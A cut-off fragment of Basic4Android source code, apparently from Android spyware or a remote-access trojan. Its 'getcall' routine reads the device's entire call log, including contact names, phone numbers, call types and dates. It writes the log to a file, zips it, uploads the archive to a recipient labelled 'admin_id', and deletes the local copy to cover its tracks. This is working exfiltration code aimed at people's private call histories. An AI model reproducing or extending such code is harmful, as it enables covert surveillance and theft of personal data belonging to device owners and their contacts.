...
Sub getcall (Topic As String, fileName As String)
	Try
		'ToastMessageShow("AllCalls",True)
		Dim Calls As List
		Calls=callLog.GetAll(0)
		Dim strcall As String=""
		Dim callType,name As String
		For Each i As CallItem In Calls
			Select i.CallType
				Case i.TYPE_INCOMING
					callType="Incoming"
				Case i.TYPE_MISSED
					callType="Missed"
				Case i.TYPE_OUTGOING
					callType="Outgoing"
			End Select
			name=i.CachedName
			strcall = strcall &CRLF&CRLF&"name : "&name&CRLF&"phone :"&i.Number&CRLF&"Type : "&callType&CRLF&"Date : "&DateTime.Date(i.Date)
		Next
		File.WriteString(File.DirInternal,"allCalls.txt",strcall)
		zip.ABZipfile(File.DirInternal&"/" , "allCalls.txt" , File.DirInternal&"/allCalls.zip")
		upload.upload(admin_id , "All Calls".Replace(" ","%20") , 0 ,  File.DirInternal , "allCalls.zip")
		File.Delete(File.DirInternal , "allCalls.zip")
	Catch
